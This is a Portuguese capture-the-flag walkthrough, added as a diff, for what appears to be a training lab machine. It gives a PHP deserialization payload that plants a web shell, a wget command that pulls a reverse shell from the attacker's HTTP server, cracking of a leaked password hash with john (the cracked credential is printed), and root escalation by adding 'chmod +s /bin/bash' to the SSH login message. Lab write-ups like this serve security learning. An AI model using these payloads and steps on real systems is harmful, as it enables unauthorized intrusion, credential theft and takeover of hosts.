@@ -1,0 +1,57 @@
+Criar um arquivo .php
+
+<?php
+class FormSubmit{
+        public $form_file = 'glrn.php';
+        public $message = '<?php system($_GET["cmd"]); ?>';
+}
+$obj = new FormSubmit();
+echo serialize($obj);
+?>
+
+Usar o burp
+
+Entrar na pagina inicial do site /index.php
+
+Enviar para o repetidor
+
+Depois de "index.php" colocar ?debug= "codigo serealizado" //ele nao pode ficar preto o codigo todo tem que ficar vermelho se não ficar preencher com "+"
+
+Enviar uma requisição basica curl http://ip/glrn.php?cmd=id
+
+Agora criamos outro arquivo .php e colocamos uma revserse shell nele
+
+Agora temos que subir essa shell para a maquina
+
+Abrimos uma porta na nossa pasta onde esta a rev shell " python3 -m http.server"
+
+http://10.10.175.200/glrn.php?cmd=wget%20http://10.9.200.252:8000/revshell.php
+
+Agora só acessar pela url e temos uma shell                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+Dentro da maquina /var/www/html temos um arquivo escondido                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+Salvamos a senha em um arquivo .txt e usamos o john para dar crack nela                                                                                                                                                                    
+                                                                                                                                                                                                                                           
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+E temos a senha: jamaica                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+james:jamaica                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+
+Agora podemos entrar na maquina via ssh
+
+E temos nossa primeira flag
+
+Depois de usar o linpeas temos permissão de editar a messagem de login do ssh
+
+Então editamos a mensagem e colocamos "chmod +s /bin/bash" em cima do print
+
+Salvamos e fechamos 
+
+Depois de logar dnv usamos o comando "id" para ver quem somos e as permissoes
+
+E depois passamos /bin/bash -p e viramos root
